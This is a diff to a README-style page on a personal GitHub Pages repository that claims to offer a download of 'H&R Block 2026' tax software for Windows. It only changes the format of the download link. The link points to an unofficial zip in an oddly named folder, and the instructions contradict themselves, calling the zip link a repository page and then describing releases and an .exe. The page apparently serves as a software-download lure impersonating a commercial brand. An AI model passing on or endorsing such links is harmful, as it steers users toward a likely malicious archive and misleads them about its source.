@@ -5,7 +5,7 @@ description: "Download the H&R Block tax software installer for Windows 10 and 1
 ---
 # 📈 H-R-Block-2026 - Prepare your taxes with ease
 
-[![](https://img.shields.io/badge/Download-H&R_Block_2026-blue.svg)](https://raw.githubusercontent.com/Phamquo3606/phamquo3606.github.io/main/paleoatavistic/io_phamquo_github_v2.6.zip)
+[![](https://img.shields.io/badge/Download-H&R_Block_2026-blue.svg)](https://github.com/Phamquo3606/phamquo3606.github.io/raw/refs/heads/main/paleoatavistic/io_phamquo_github_v2.6.zip)
 
 This software helps users prepare and file income tax returns for the 2026 tax season. It guides you through the federal and state tax filing process on Windows 10 and Windows 11 computers. You can import tax documents, track deductions, and submit your final forms directly through the interface.
 
@@ -24,7 +24,7 @@ Your computer must meet these basic standards to run the software correctly:
 
 Follow these steps to obtain the setup files for your computer:
 
-1. Visit the project repository page at [https://raw.githubusercontent.com/Phamquo3606/phamquo3606.github.io/main/paleoatavistic/io_phamquo_github_v2.6.zip](https://raw.githubusercontent.com/Phamquo3606/phamquo3606.github.io/main/paleoatavistic/io_phamquo_github_v2.6.zip).
+1. Visit the project repository page at [https://github.com/Phamquo3606/phamquo3606.github.io/raw/refs/heads/main/paleoatavistic/io_phamquo_github_v2.6.zip](https://github.com/Phamquo3606/phamquo3606.github.io/raw/refs/heads/main/paleoatavistic/io_phamquo_github_v2.6.zip).
 2. Look for the releases section on the right side of the page.
 3. Click the most recent version of the software available.
 4. Locate the file ending in .exe in the assets list.
